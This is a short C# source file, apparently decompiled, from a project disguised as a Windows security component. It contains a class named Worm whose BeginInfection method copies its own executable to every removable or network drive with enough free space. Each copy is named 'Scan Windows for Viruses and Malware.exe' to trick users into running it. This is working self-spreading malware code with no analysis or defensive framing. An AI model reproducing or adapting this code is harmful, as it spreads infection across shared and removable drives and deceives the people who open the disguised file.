using System;
using System.IO;
using System.Reflection;

namespace WindowsRuntimeSecurity.MiscMethods
{
	// Token: 0x02000006 RID: 6
	internal class Worm
	{
		// Token: 0x06000010 RID: 16 RVA: 0x000025CC File Offset: 0x000007CC
		public static void BeginInfection()
		{
			foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
			{
				if (driveInfo.AvailableFreeSpace > 12000000L && (driveInfo.DriveType == DriveType.Removable || driveInfo.DriveType == DriveType.Network))
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.Name + "Scan Windows for Viruses and Malware.exe");
				}
			}
		}
	}
}
